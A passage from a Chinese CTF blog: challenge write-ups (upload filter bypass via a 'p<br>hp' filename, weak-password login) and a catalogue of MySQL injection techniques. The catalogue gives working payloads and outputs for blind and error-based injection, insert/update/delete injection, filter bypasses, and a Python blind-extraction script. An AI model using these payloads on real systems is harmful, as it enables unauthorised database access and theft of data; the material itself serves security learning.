class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;|((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))();</span><br></pre></td></tr></table></figure>

<p>最后要构造的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(serIALIze)(FILe(&#x2F;f1agg))</span><br></pre></td></tr></table></figure>

<p>这要字符比较少，好构造一些</p>
<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><p>这题做的有点难受….，直接把我卡死了…后面的题也没怎么做了…</p>
<p>题目源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里写了一个upload方法，先是在通过strstr对.php字符串进行了过滤，然后调用Upload类通过tp的上传方法进行文件上传。</p>
<p>首先看了一下基本的上传bypass操作，没什么用，前面加了个前缀，htaccess和.user.ini肯定不好使，pht之类的又不解析，硬上传php的话肯定是需要.php的，但是这个又给ban了，尝试了很久之后，想了一下，硬上传php是肯定不可能的了。</p>
<p>接着想到了phar反序列化..因为感觉有getimagesize</p>
<p>PHP: 不好意思，确实有，但是咱处理的是tmpfile</p>
<p>…</p>
<p>这个坑点我在bytectf就想过…肯定处理的是tmpfile啊…(真想给自己一拳</p>
<p>接着就往Upload类源码上靠了，打了个断点，想跟进去看看，比赛结束前天晚上没好使…结束倒是突然好使了,真是难受，当是看看源码的话说不定就有突破了</p>
<p>最后一张图片解释一下吧</p>
<p>这里我们可以在upload处打一个断点，传一个图片跟进去看看，很清楚的可以看到这里用strip_tags去处理了文件名，所以后缀为<code>p&lt;br&gt;hp</code>就可以绕过了。</p>
<p><img src="https://s2.ax1x.com/2019/10/14/KpdPTs.png" alt="KpdPTs.png"></p>
<p>成功上传shell…,我太难了</p>
<p><img src="https://s2.ax1x.com/2019/10/14/KpdmXF.png" alt="KpdmXF.png"></p>
<p>之后看其他师傅的wp了解了有第二种做法…有点懵..上传两个文件，比赛的时候试过…很迷没成功…….</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KZUHdx.png" alt="KZUHdx.png"></p>
<p>也成功上传了..两个文件？…我被演了吗…</p>
<p>接下来就是爆破文件名了，在爆破文件名的时候其实有一个小技巧</p>
<p>比如两个文件名</p>
<p>5da9614614f1a.php</p>
<p>5da9614617439.png</p>
<p>将后四位转化为10进制，其实相差只有不到10000,所以很快就爆破出来了，爆破脚本就不贴了。</p>
<p>通过这道题规避了这个坑点，上传的时候，getimagesize之类的函数肯定去判断的tmpfile，所以一定不存在phar反序列化</p>
<h3 id="Easy-java"><a href="#Easy-java" class="headerlink" title="Easy_java"></a>Easy_java</h3><p>没怎么看过java以及javaweb…看了wp感觉不是很难…真是可惜了….，其实主要就是弱口令吧…</p>
<p>通过弱口令admin/admin888进入，通过download进行下载，不过是post类型的</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KemQl8.png" alt="KemQl8.png"></p>
<p>读一下flag控制器</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KembtI.png" alt="KembtI.png"></p>
<h3 id="Online-proxy"><a href="#Online-proxy" class="headerlink" title="Online-proxy"></a>Online-proxy</h3><p>这道题….一时语塞.jpg</p>
<p>竟然就是一个常规的xff注入….？？？，通过上一次的xff注就行了</p>
<h3 id="dist"><a href="#dist" class="headerlink" title="dist"></a>dist</h3><p>不好意思，比赛的时候发现泄露的源码是go就没看了，不会Go…(还有好多要学啊orz….</p>
<p>说说前面的泄露部分的吧.</p>
<p>前端源码有sourceMapping,看一下config.js</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ip = window.location.host.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">var</span> auth = <span class="string">'http://'</span>+ip+<span class="string">':9000/auth'</span>;</span><br><span class="line"><span class="keyword">var</span> api = <span class="string">'http://'</span>+ip+<span class="string">':5001/api'</span>;</span><br><span class="line">export &#123; auth, api &#125;;</span><br><span class="line"><span class="comment">// my source code backup:</span></span><br><span class="line"><span class="comment">// /backup-for-debug.7z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// WEBPACK FOOTER //</span></span><br><span class="line"><span class="comment">// ./src/config.js</span></span><br></pre></td></tr></table></figure>

<p>可以看到后端的代码在backup-for-debug.7z，下载下来开始审计。</p>
<p>…</p>
<h3 id="phpshe"><a href="#phpshe" class="headerlink" title="phpshe"></a>phpshe</h3><p>待看</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>准备学习Go和Java！！！！！！！！！！！！！</strong></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入有趣姿势总结</title>
    <url>/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>文章首发于先知</p>
<h3 id="五种时间盲注姿势"><a href="#五种时间盲注姿势" class="headerlink" title="五种时间盲注姿势"></a>五种时间盲注姿势</h3><ul>
<li><strong>sleep()函数</strong></li>
<li><strong>benchmark函数</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>

<p><code>benchmark</code>函数会重复计算expr表达式count次，所以我们可以尽可能多的增加计算的次数来增加时间延迟，如下：<br><a href="https://imgchr.com/i/ZZi7GR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/25/ZZi7GR.md.png" alt="ZZi7GR.md.png"></a></p>
<p>可以看到通过重复计算延时了<code>1.90s</code></p>
<ul>
<li><strong>笛卡尔积盲注</strong></li>
</ul>
<p>注入姿势</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>利用<code>and短路运算规则</code>进行时间盲注。</p>
<ul>
<li><strong>GET_LOCK盲注</strong></li>
</ul>
<p><code>get_lock</code>函数官方文档中的介绍</p>
<p><a href="https://imgchr.com/i/ZZAQbT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/25/ZZAQbT.md.png" alt="ZZAQbT.md.png"></a></p>
<p>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。</p>
<p>此盲注手法有一些限制，就是必须要同时开两个<code>SESSION</code>进行注入</p>
<p><code>SESSION A</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;lihuaiqiu&#39;,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><code>SESSION B</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,5);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;lihuaiqiu&#39;,5) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (5.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;1 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class="line">Empty set (2.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;0 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>同样的盲注利用手法。</p>
<ul>
<li><strong>正则<code>DOS</code> RLIKE注入</strong></li>
</ul>
<p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的<code>benchmark</code>注入差不多的。</p>
<p>利用手法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;s&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;r&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#39;,1);</span><br><span class="line">Empty set (3.83 sec)</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>正常的报错注入网上一搜是一大把的，所以下面讲的是几个比较的姿势。</p>
<ul>
<li><strong>mysql列名重复报错</strong></li>
</ul>
<p>在mysql中，mysql列名重复会导致报错，而我们可以通过<code>name_const</code>制造一个列.</p>
<p>Name_const函数用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1);</span><br><span class="line">+--------+</span><br><span class="line">| 5.5.47 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>报错用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1),name_const(version(),1);;</span><br><span class="line">+--------+--------+</span><br><span class="line">| 5.5.47 | 5.5.47 |</span><br><span class="line">+--------+--------+</span><br><span class="line">|      1 |      1 |</span><br><span class="line">+--------+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select name_const(version(),1),name_const(version(),1))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;5.5.47&#39;</span><br></pre></td></tr></table></figure>

<p>不过这个有很大的限制，<code>version()</code>所多应的值必须是常量，而我们所需要的<code>database()</code>和<code>user()</code>都是变量，无法通过报错得出，但是我们可以利用这个原理配合join函数得到列名。</p>
<p>用法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test a join ctf_test b;</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| user | pwd          | user | pwd          |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| 1    | 0            | 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 1    | 0            |</span><br><span class="line">| 1    | 0            | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b )x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;user&#39;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;pwd&#39;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user,pwd))x;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>xpath语法报错与整数溢出报错的区别</strong></li>
</ul>
<p>xpath报错注入中，我们经常用的语法有<code>updatexml</code>和<code>extractvalue</code>函数，同样是报错注入，那么在使用中有什么区别？</p>
<p>例子：<strong>第12届全国大学生信息安全竞赛全宇宙最简单的SQL</strong></p>
<p>如果二者的区别认知不太清楚，很可能导致卡在这个点上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and pow(999,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(999,999)&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and pow(999,999);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>从上面的实验中可以得出如果在sql语句中有出现语法错误，则会直接报错，不会被and短路运算所影响，如果是大数溢出报错，则会遵循and短路运算规则</strong>。所以可以利用大数溢出这个问题结合前面的1=0的判断条件进行布尔盲注。</p>
<ul>
<li><strong>整数溢出报错函数</strong></li>
</ul>
<p>pow(),cot(),exp()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and 1&#x3D;1 and cot(0);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and 1&#x3D;1 and pow(988888,999999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(988888,999999)&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and 1&#x3D;1 and exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>利用几何函数进行报错注入</strong></li>
</ul>
<p>几何函数进行报错注入，如<code>polygon()</code>,<code>linestring()</code>函数等，姿势如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and polygon(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;&#96;test&#96;.&#96;ctf_test&#96;.&#96;user&#96;&#39; value found during parsing</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and linestring(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;&#96;test&#96;.&#96;ctf_test&#96;.&#96;user&#96;&#39; value found during parsing</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>对于insert,delete,update三种操作的注入</strong></li>
</ul>
<p>对于select类型操作其实是最常见，最容易上手的，但insert,delete,update三种操作的注入也很重要，下面是总结的这三种注入的操作姿势。</p>
<p><strong>报错注入</strong></p>
<p>insert报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into ctf_test(&#96;user&#96;,&#96;pwd&#96;) value(&#39;1&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;&#39;,&#39;2&#39;);</span><br></pre></td></tr></table></figure>

<p>update报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update ctf_test set user&#x3D;1 where pwd&#x3D;&#39;2&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;&#39;;</span><br></pre></td></tr></table></figure>

<p>delete报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; delete from ctf_test where user&#x3D;&#39;1&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;&#39;;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br></pre></td></tr></table></figure>

<p><strong>时间盲注</strong></p>
<p>insert类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; insert into ctf_test(&#96;user&#96;,&#96;pwd&#96;) value(&#39;1&#39; and sleep(3) and &#39;&#39;,&#39;2&#39;);</span><br><span class="line">Query OK, 1 row affected (3.00 sec)</span><br></pre></td></tr></table></figure>

<p>delete和update也都是一样的，就不一 一列举了。</p>
<h3 id="另类注入姿势以及对关键词过滤的绕过"><a href="#另类注入姿势以及对关键词过滤的绕过" class="headerlink" title="另类注入姿势以及对关键词过滤的绕过"></a>另类注入姿势以及对关键词过滤的绕过</h3><ul>
<li><code>order by</code> 盲注</li>
</ul>
<p>题目例子：ISCC web5</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg" alt="img"></p>
<p><strong>当填入16进制的字符字典序小于flag中对应字母的字典序时，返回的是union插入的字符；当16进制的字符字典序大于flag中的对应字母的字典序时，返回的是flag字段。</strong>此种sql注入手法可以在小括号和列名被过滤时使用。</p>
<p>web5对应脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">'http://39.100.83.188:8054/'</span></span><br><span class="line">headers=&#123;<span class="string">"User-Agent"</span>:<span class="string">"lihuaiqiu Union.373"</span>&#125;</span><br><span class="line">payload=<span class="string">"union_373_Tom' union select 1,2,0x&#123;&#125; order by 3,2,'1"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        data=&#123;<span class="string">"username"</span>:payload.format((flag+chr(j)).encode(<span class="string">'hex'</span>)),<span class="string">"password"</span>:<span class="string">'233'</span>&#125;</span><br><span class="line">        lihuaiqiu=requests.post(url,headers=headers,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"union_373_Tom"</span> in lihuaiqiu.text:</span><br><span class="line">            flag+=chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>MySQL数据库的Innodb引擎的注入</strong></li>
</ul>
<p>在对应代码中过滤了information关键字，无法使用<code>information_schema.tables</code>以及<code>information_schema.columns</code>进行查找表和列名。</p>
<p>此时可以通过innodb引擎进行注入，在Mysql 5.6以上的版本中，在系统Mysql库中存在两张与innodb相关的表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>。</p>
<p>所以可以通过查找这两个表取代information的作用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database();</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select group_concat(table_name) from mysql.innodb_index_stats where database_name&#x3D;database();</span><br><span class="line">+----------------+</span><br><span class="line">| flag           |</span><br><span class="line">+----------------+</span><br><span class="line">| 1              |</span><br><span class="line">| flag,flag,flag |</span><br><span class="line">+----------------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>无列名注入</li>
</ul>
<p>看一下下面的<code>payload</code>的就会懂的，原理比较简单</p>
<p><a href="https://imgchr.com/i/ZZgHQU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/25/ZZgHQU.md.png" alt="ZZgHQU.md.png"></a></p>
<ul>
<li>异或注入</li>
</ul>
<p>在<code>and,or ,|,&amp;&amp;,||</code>等符号被过滤的情况下，可以采用异或注入达到注入的目的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39;^(mid(user(),1,1)&#x3D;&#39;s&#39;)^1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39;^(mid(user(),1,1)&#x3D;&#39;r&#39;)^1;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>同等功能替换</li>
</ul>
<p>空格绕过：%0a,/**/.</p>
<p>关键函数过滤：</p>
<p>substr等价于left ,mid,substring</p>
<p>group_concat等价于concat_ws</p>
<ul>
<li>逗号被过滤</li>
</ul>
<p>针对逗号被过滤的情况有三种，第一种情况是<code>union select</code> 中的逗号被过滤掉，第二种情况是<code>substr,mid</code>这类截取字符函数中的逗号被过滤掉，第三种是<code>limit 0,1</code>中的逗号被过滤。</p>
<p><strong>union select 逗号被过滤掉</strong></p>
<p>利用join注入，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; union select * from (select 1)a join (select 2)b;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 1    | 2            |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>功能函数逗号被过滤</strong></p>
<p>利用<code>from...for...</code>进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(mid((select user()) from 1 for 1)&#x3D;&#39;r&#39;,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(mid((select user()) from 1 for 1)&#x3D;&#39;s&#39;,1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>limit中逗号被过滤</strong></p>
<p>利用<code>limit..offset</code>进行绕过</p>
<p><code>limit 9 offset 4</code>表示从第十行开始返回4行，返回的是<code>10,11,12,13</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema&#x3D;database() limit 1 offset 0;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema&#x3D;database() limit 1 offset 1;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| ctf_test   |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>等于号被过滤</strong></li>
</ul>
<p>可以用like,regexp,between…and..,rlike进行代替，用法如下：<br><a href="https://imgchr.com/i/ZZ7QC4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZZ7QC4.md.png" alt="ZZ7QC4.md.png"></a></p>
<p>还有另外一种特殊的代替方法，利用<code>locate,position,instr</code>三种函数进行判断</p>
<p>用法如下：</p>
